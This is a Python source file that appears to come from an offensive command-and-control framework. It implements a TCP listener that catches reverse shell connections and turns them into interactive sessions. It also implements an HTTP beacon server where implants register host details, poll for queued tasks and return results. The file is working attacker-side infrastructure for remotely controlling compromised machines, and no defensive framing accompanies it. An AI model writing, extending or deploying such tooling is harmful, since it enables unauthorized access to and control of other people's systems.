#!/usr/bin/env python3
"""
Payload Handlers for Session Management
"""

import socket
import threading
import subprocess
import sys
import time
from core.session_manager import SessionManager

class ReverseShellHandler:
    def __init__(self, session_manager):
        self.session_manager = session_manager
        self.active_handlers = {}
        self.handler_counter = 0
    
    def start_tcp_handler(self, lhost, lport, handler_id, session_manager):
        """Start TCP reverse shell handler that captures connections"""
        try:
            print(f"[*] Starting TCP reverse shell handler on {lhost}:{lport}")
            
            # Create socket server
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((lhost, lport))
            server_socket.listen(5)
            server_socket.settimeout(1)  # Non-blocking with timeout
            
            print(f"[+] TCP handler listening on {lhost}:{lport}")
            print(f"[+] Waiting for reverse shell connections...")
            
            self.active_handlers[handler_id] = {
                'socket': server_socket,
                'lhost': lhost,
                'lport': lport,
                'active': True
            }
            
            while self.active_handlers.get(handler_id, {}).get('active', False):
                try:
                    # Accept incoming connections
                    client_socket, client_address = server_socket.accept()
                    print(f"[+] Reverse shell connection received from {client_address}")
                    
                    # Create a session for this connection
                    target_info = f"{client_address[0]}:{client_address[1]} (Reverse Shell)"
                    session_id = session_manager.create_session("reverse_shell", target_info)
                    
                    # Store the client socket in the session
                    session = session_manager.get_session(session_id)
                    if session:
                        session.socket = client_socket
                        session.metadata = {
                            "LHOST": lhost,
                            "LPORT": lport,
                            "handler_id": handler_id,
                            # Store as string: tuples are not JSON-serializable (fixes S6)
                            "client_address": f"{client_address[0]}:{client_address[1]}"
                        }
                        print(f"[+] Session {session_id} created with active socket")
                        print(f"[+] Use 'session {session_id}' to interact")
                    
                except socket.timeout:
                    # Timeout for non-blocking accept, check if we should continue
                    continue
                except Exception as e:
                    if self.active_handlers.get(handler_id, {}).get('active', False):
                        print(f"[-] Handler error: {e}")
                    break
            
            # Cleanup
            server_socket.close()
            if handler_id in self.active_handlers:
                del self.active_handlers[handler_id]
            print(f"[-] TCP handler {handler_id} stopped")
            
        except Exception as e:
            print(f"[-] TCP handler failed: {e}")
    
    def stop_tcp_handler(self, handler_id):
        """Stop a TCP handler"""
        if handler_id in self.active_handlers:
            self.active_handlers[handler_id]['active'] = False
            print(f"[+] Stopping handler {handler_id}")
            return True
        else:
            print(f"[-] Handler {handler_id} not found")
            return False
    
    def list_handlers(self):
        """List active handlers"""
        return self.active_handlers

import json
import logging
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

class BeaconHTTPRequestHandler(BaseHTTPRequestHandler):
    """Handles HTTP beacon requests"""
    def log_message(self, format, *args):
        # Suppress standard logging to prevent console spam
        pass

    def do_POST(self):
        handler_instance = self.server.handler_instance
        session_manager = handler_instance.session_manager
        
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        if self.path == '/register':
            try:
                sysinfo = json.loads(post_data.decode('utf-8'))
                client_ip = self.client_address[0]
                target_info = f"{client_ip} (HTTP Beacon) - {sysinfo.get('user', 'unknown')}@{sysinfo.get('hostname', 'unknown')}"
                
                # Create new session
                session_id = session_manager.create_session("beacon", target_info)
                session = session_manager.get_session(session_id)
                if session:
                    session.metadata = sysinfo
                    session.metadata['LHOST'] = self.server.server_address[0]
                    session.metadata['LPORT'] = self.server.server_address[1]
                    session.tasks = []
                    session.results = {}
                    
                    print(f"\n[+] HTTP Beacon registered from {client_ip} as {session_id}")
                    
                    response = {'session_id': session_id}
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(response).encode())
                    return
            except Exception as e:
                print(f"[-] Beacon registration failed: {e}")
                
        elif self.path.startswith('/results/'):
            session_id = self.path.split('/')[-1]
            session = session_manager.get_session(session_id)
            if session and hasattr(session, 'results'):
                try:
                    result_data = json.loads(post_data.decode('utf-8'))
                    task_id = result_data.get('task_id')
                    
                    # Store result
                    session.results[task_id] = result_data
                    session.last_seen = time.time()  # update liveness
                    
                    self.send_response(200)
                    self.end_headers()
                    return
                except Exception as e:
                    pass
                    
        self.send_response(400)
        self.end_headers()

    def do_GET(self):
        handler_instance = self.server.handler_instance
        session_manager = handler_instance.session_manager
        
        if self.path.startswith('/tasks/'):
            session_id = self.path.split('/')[-1]
            session = session_manager.get_session(session_id)
            
            if session and hasattr(session, 'tasks'):
                session.last_seen = time.time()  # update liveness
                
                tasks_to_send = []
                # Pop all pending tasks (simple FIFO)
                while session.tasks:
                    tasks_to_send.append(session.tasks.pop(0))
                    
                response = {'tasks': tasks_to_send}
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())
                return
                
        self.send_response(404)
        self.end_headers()

class HTTPHandler:
    def __init__(self, session_manager):
        self.session_manager = session_manager
        self.active_handlers = {}
    
    def _run_server(self, lhost, lport, handler_id):
        try:
            print(f"[*] Starting HTTP beacon handler on {lhost}:{lport}")
            server = ThreadingHTTPServer((lhost, lport), BeaconHTTPRequestHandler)
            server.handler_instance = self
            server.timeout = 1  # For graceful shutdown checking
            
            self.active_handlers[handler_id] = {
                'server': server,
                'lhost': lhost,
                'lport': lport,
                'active': True
            }
            
            print(f"[+] HTTP handler listening on {lhost}:{lport}")
            
            # Poll for requests with a timeout so we can check active flag
            while self.active_handlers.get(handler_id, {}).get('active', False):
                server.handle_request()
                
            server.server_close()
            print(f"[-] HTTP handler {handler_id} stopped")
            
        except Exception as e:
            print(f"[-] HTTP handler failed: {e}")
            if handler_id in self.active_handlers:
                del self.active_handlers[handler_id]
                
    def start_http_handler(self, lhost, lport, handler_id, session_manager):
        """Start HTTP handler for beacon sessions"""
        # Start server in a background thread
        thread = threading.Thread(
            target=self._run_server, 
            args=(lhost, lport, handler_id),
            daemon=True
        )
        thread.start()
        return handler_id
        
    def stop_http_handler(self, handler_id):
        """Stop an HTTP handler"""
        if handler_id in self.active_handlers:
            self.active_handlers[handler_id]['active'] = False
            print(f"[+] Stopping HTTP handler {handler_id}")
            return True
        else:
            print(f"[-] HTTP handler {handler_id} not found")
            return False
            
    def list_handlers(self):
        """List active HTTP handlers"""
        return self.active_handlers